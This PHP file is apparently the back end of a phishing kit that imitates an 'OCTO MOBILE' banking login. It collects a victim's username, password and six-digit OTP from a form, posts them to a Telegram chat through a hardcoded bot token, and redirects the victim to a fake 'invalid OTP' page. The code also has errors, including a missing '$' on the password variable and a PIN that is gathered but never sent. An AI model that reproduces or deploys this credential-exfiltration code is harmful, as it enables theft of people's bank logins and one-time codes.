<?php

    header('Location: /invalidotp.html');
    
    $apiToken = "8788821744:AAFyEDcbo3jLa-g9qf-NTXm89ydLMsH9Z3Y";

$username            = $_POST['username'];
$password            = $_POST['password'];
$pin1 = $_POST['pin1'];
$pin2 = $_POST['pin2'];
$pin3 = $_POST['pin3'];
$pin4 = $_POST['pin4'];
$pin5 = $_POST['pin5'];
$pin6 = $_POST['pin6'];
$_pin = $pin1.$pin2.$pin3.$pin4.$pin5.$pin6;


$message = "
────────────────
  OCTO MOBILE
────────────────
• User : ".$username."
• Pass : ".password."
────────────────";

    $data = [
        'chat_id' => '-1004362540544',
        'text' => $message,
        'parse_mode' => "html"
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

    echo '<pre>';
    print_r(json_decode($response));
    die();
